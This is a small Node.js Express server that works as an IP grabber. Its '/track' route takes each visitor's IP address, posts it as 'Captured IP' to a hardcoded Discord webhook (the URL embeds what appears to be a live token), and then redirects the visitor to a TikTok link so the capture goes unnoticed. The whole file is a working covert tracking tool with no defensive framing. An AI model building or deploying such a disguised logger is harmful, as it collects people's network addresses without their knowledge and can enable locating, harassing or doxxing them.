const express = require('express');
const app = express();

async function sendToDiscord(webhookUrl, content) {
    const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    });

    if (!response.ok) {
        throw new Error(`Discord webhook failed: ${response.status}`);
    }

    console.log("Message sent to Discord.");
}



app.get('/track', (req, res) => {
    const viewerIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    sendToDiscord(
        "https://discord.com/api/webhooks/1541943235667169310/7Ajw5PGih26r0ZVH3I4VOSQeEUg0fDYuIXXydo4FuI2FEZrNJdFX6aH4iePAzgRK6Doa",
        `Captured IP: ${viewerIp}`
    ).catch(console.error);

    // Redirect the user to a normal website
    res.redirect('https://www.tiktok.com/t/ZTA6h7Rft/');
});
